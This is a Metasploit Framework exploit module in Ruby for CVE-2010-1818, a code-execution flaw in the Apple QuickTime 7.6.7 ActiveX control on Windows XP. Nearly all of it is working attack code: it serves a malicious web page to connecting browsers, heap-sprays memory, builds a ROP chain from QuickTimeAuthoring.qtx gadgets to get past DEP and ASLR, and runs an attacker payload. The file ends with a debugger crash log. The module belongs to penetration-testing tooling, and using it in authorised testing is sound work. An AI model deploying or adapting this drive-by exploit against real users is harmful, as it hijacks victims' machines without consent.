##
# $Id: apple_quicktime_marshaled_punk.rb 11513 2011-01-08 00:25:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Seh

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:javascript => true,
		:rank       => NormalRanking, # reliable memory corruption
		:vuln_test  => nil,
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple QuickTime 7.6.7 _Marshaled_pUnk Code Execution',
			'Description'    => %q{
					This module exploits a memory trust issue in Apple QuickTime
				7.6.7. When processing a specially-crafted HTML page, the QuickTime ActiveX
				control will treat a supplied parameter as a trusted pointer. It will
				then use it as a COM-type pUnknown and lead to arbitrary code execution.

				This exploit utilizes a combination of heap spraying and the
				QuickTimeAuthoring.qtx module to bypass DEP and ASLR. This module does not
				opt-in to ASLR. As such, this module should be reliable on all Windows
				versions.

				NOTE: The addresses may need to be adjusted for older versions of QuickTime.
			},
			'Author'         =>
				[
					'Ruben Santemarta',  # original discovery
					'jduck'              # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11513 $',
			'References'     =>
				[
					[ 'CVE', '2010-1818' ],
					[ 'OSVDB', '67705'],
					[ 'URL', 'http://reversemode.com/index.php?option=com_content&task=view&id=69&Itemid=1' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 384, # perhaps more?
					'BadChars' => "",  # none...
					'DisableNops' => true,
					'PrependEncoder' => Metasm::Shellcode.assemble(Metasm::Ia32.new, "mov esp,ebp").encode_string, # fix esp up
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					# Tested OK:
					#
					# QT 7.6.6 + XP SP3 + IE8
					# QT 7.6.7 + XP SP3 + IE6
					#

					# @eromange reports it doesn't work on 7.6.5
					# - further investigation shows QuickTimeAuthoring.qtx changed / rop gadgets different

					# QuickTimeAuthoring.qtx 7.6.7 is compiled w/DYNAMIC_BASE, so win7 is :(

					[ 'Apple QuickTime Player 7.6.6 and 7.6.7 on Windows XP SP3',
						{
							'Ret' => 0x677a0000, # base of QuickTimeAuthoring.qtx
							#'Ret' => 0x67780000, # base of QuickTimeAuthoring.qtx v7.6.5
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 30 2010',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(client, request)

		return if ((p = regenerate_payload(client)) == nil)

		print_status("Sending #{self.name} exploit HTML to #{client.peerhost}:#{client.peerport}...")

		shellcode = Rex::Text.to_unescape(p.encoded)

		# We will spray to this address, hopefully
		spray_target = 0x15220c20

		# This is where our happy little dll is loaded
		# 677a0000 679ce000   QuickTimeAuthoring C:\Program Files\QuickTime\QTSystem\QuickTimeAuthoring.qtx
		rop_mod_base = target.ret

		sploit = [
			spray_target - 8,

			# This first piece of code points the stack pointer to our data!
			# NOTE: eax, ecx, and esi all point to our spray at this point.
			rop_mod_base + 0x79c12, # xchg eax,esp / pop edi / pop esi / ret

			# The second one becomes the new program counter after stack flip.
			rop_mod_base + 0x1e27,       # pop ecx / ret
				rop_mod_base + 0x170088,  # the IAT addr for HeapCreate (becomes ecx)

			# We get the address of HeapCreate from the IAT here.
			rop_mod_base + 0x10244, # mov eax,[ecx] / ret

			# Call HeapCreate to create the k-rad segment
			rop_mod_base + 0x509e, # call eax
				0x01040110, # flOptions (gets & with 0x40005)
				0x01010101, # dwInitialSize
				0x01010101, # dwMaximumSize

			# Don't bother calling HeapAlloc, just add 0x8000 to the Heap Base

			# Set ebx to our adjustment
			rop_mod_base + 0x307a, # pop ebx / ret
				0x8000, # becomes ebx

			# Adjust eax
			rop_mod_base + 0xbfb5b, # add eax,ebx / ret

			# Save our buffer pointer off to this address
			rop_mod_base + 0x1e27,       # pop ecx / ret
				rop_mod_base + 0x2062d4,  # something writable

			# Write eax to the address
			rop_mod_base + 0x8fd6, # mov [ecx], eax / ret

			# Now we must copy our real payload into the buffer

			# First, setup edi
			rop_mod_base + 0x134fd5, # xchg eax,edi / ret

			# Get ESI from EDI (which is now in EAX)
			rop_mod_base + 0x103ff8, # push eax / pop esi / pop ebx / ret
				0x41414141, # scratch (becomes ebx)

			# Set ECX from the stack
			rop_mod_base + 0x1e27,       # pop ecx / ret
				0x200 / 4, # dwords to copy :)

			# copy it!
			rop_mod_base + 0x778d2, # rep movsd / pop edi / pop esi / ret
				0x41414141, # scratch (becomes edi)
				0x41414141, # scratch (becomes esi)

			# Re-load the buffer pointer address
			rop_mod_base + 0x1e27,       # pop ecx / ret
				rop_mod_base + 0x2062d4,  # something writable

			# And the pointer value itself
			rop_mod_base + 0x10244, # mov eax,[ecx] / ret

			# Set ebx to our adjustment
			rop_mod_base + 0x307a, # pop ebx / ret
				0x42424242, # will be filled after array init

			# Adjust eax
			rop_mod_base + 0xbfb5b, # add eax,ebx / ret

			# Jump!
			rop_mod_base + 0x509e,  # call eax

			# eh? Hopefull we didn't reach here.
			0xdeadbeef
		]
		sploit[27] = 8 + (sploit.length * 4)
		sploit = sploit.pack('V*')
		sploit << p.encoded
		sploit = Rex::Text.to_unescape(sploit)

		custom_js = <<-EOF
function Prepare()
{
	var block = unescape("#{sploit}");
	while(block.length < 0x200)
		block += unescape("%u0000");
	heap = new heapLib.ie(0x20000);
	while(block.length < 0x80000)
		block += block;
	finalspray = block.substring(2, 0x80000 - 0x21);
	for(var i = 0; i < 350; i++)
	{
	heap.alloc(finalspray);
	}
}

function start()
{
	var obj = '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
		+ '</'+ 'object>';
	document.getElementById('stb').innerHTML = obj;
	Prepare();
	var targ = #{spray_target};
	var obj = '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"' + '>'
		+ '<' + 'PARAM name="_Marshaled_pUnk" value="' + targ + '"' + '/>'
		+ '</'+ 'object>';
	document.getElementById('xpl').innerHTML = obj;
}
EOF

		hl_js = heaplib(custom_js)

		content = <<-EOF
<html>
<head>
<script language="javascript">
#{hl_js}
</script>
</head>
<body onload="start()">
<div id="stb"></div>
<div id="xpl"></div>
</body>
</html>
EOF

		# ..
		send_response(client, content, { 'Content-Type' => "text/html" })

		# Handle the payload
		handler(client)
	end

end


=begin
(7fc.a4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=15220c20 ebx=00134ca8 ecx=15220c18 edx=00134b98 esi=15220c20 edi=00134bfc
eip=deadbe01 esp=00134b7c ebp=00134b90 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
deadbe01 ??              ???
=end
